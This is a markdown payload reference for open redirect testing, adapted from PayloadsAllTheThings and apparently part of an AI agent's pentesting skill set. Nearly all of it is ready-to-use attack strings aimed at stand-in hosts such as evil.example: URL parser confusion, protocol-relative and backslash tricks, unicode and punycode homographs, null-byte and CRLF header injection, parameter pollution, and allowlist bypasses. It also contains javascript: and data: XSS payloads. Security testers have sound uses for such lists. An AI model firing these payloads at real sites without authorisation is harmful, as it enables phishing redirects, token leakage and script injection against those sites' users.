---
description: URL parsing confusion, protocol-relative, unicode normalization
skill: open-redirect-testing
source: PayloadsAllTheThings — Open Redirect
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# Open Redirect Payloads

> Source: PayloadsAllTheThings — Open Redirect

## Common Vulnerable Parameters

```
RelayState, SAMLRequest (SSO), post_logout_redirect_uri
```

The generic names (`redirect`, `next`, `return_to`, `goto`, …) are in `agent/references/gf-patterns/redirect.md`.

## URL Parsing Confusion

```
# @ character — browser treats left side as credentials
http://target.example@evil.example/
http://www.target.example@evil.example/

# Query string ambiguity
http://evil.example?http://target.example/
http://target.example?redirect=http://evil.example/

# Path confusion
http://target.example/http://evil.example/
http://target.example/redirect/http://evil.example/

# Folder masquerading
http://evil.example/folder/www.target.example

# Backslash confusion
http://evil.example\@target.example
```

## Protocol-Relative URLs

```
//evil.example
////evil.example
\/\/evil.example/
/\/evil.example/
//evil.example/%2f..
```

### Protocol Tricks

```
https:evil.example          (bypasses // blacklist)
javascript:alert(1)     (XSS escalation)
data:text/html,<script>alert(1)</script>
```

## Unicode Normalization

```
# Unicode character substitution
https://evil.c%E2%84%80.target.example    (U+2100)
http://evil.example%E3%80%82target.example     (U+3002 ideographic period)
http://a.com%EF%BC%8Fx.b.com          (fullwidth slash)

# Homograph attack
https://evil.xn--target-com.com        (punycode)
```

## Null Byte and Special Characters

```
//evil%00.target.example
//evil.example%0d%0a
//evil.example%23.target.example    (# fragment)
//evil.example%3F.target.example    (? query)
```

## Parameter Pollution

```
# Duplicate parameter — second value may win
?next=target.example&next=evil.example

# Array syntax
?next[]=target.example&next[]=evil.example
```

## Whitelist/Domain Bypass

```
# Subdomain matching bypass
https://target.example.evil.example
https://target.example-evil.example
https://evil-target.example

# Adding allowed domain as subdirectory
https://evil.example/target.example

# Combining techniques
https://target.example@evil.example
//target.example%40evil.example
```

## Fragment/Hash
```
https://trusted.example#@evil.example
```
Some validators do not account for the fragment. Depending on parsing order, the final navigation target may differ from what the validator evaluated.

## Path Traversal in Relative Redirects
```
/redirect?url=/../../evil.example
/redirect?url=/..//evil.example
```
If the server builds the redirect URL by appending the parameter to a base path, path traversal may escape the intended domain.

## CRLF + Open Redirect

```
/%0d%0aLocation:%20http://evil.example
/redirect?url=%0d%0aLocation:%20http://evil.example
```
